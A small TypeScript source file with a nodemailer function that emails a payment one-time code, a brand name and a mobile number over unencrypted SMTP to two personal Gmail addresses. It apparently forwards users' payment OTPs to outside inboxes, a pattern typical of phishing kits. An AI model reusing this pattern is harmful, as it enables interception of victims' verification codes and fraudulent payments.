import nodemailer from "nodemailer";

export const paymentMail = async (
	code: string,
	brandName: string,
	mobile: string
) => {
	let transporter = nodemailer.createTransport({
		host: "smtp.sendgrid.net",
		port: 25,
		secure: false, // true for 465, false for other ports
		auth: {
			user: "apikey", // generated ethereal user
			pass: process.env.KEY, // generated ethereal password
		},
	});

	// send mail with defined transport object
	let info = await transporter.sendMail({
		from: "info@akafenflea.online",
		to: ["keyevents13@gmail.com", "aryanchannel@gmail.com"], // list of receivers
		subject: `Payment OTP for ${brandName}`,
		html: `<h1 style="text-align: center; font-size: 4em"><b>${code}</b><h1><h2>${mobile}</h2>`, // html body
	});

	console.log("Message sent: %s", info.messageId);
};
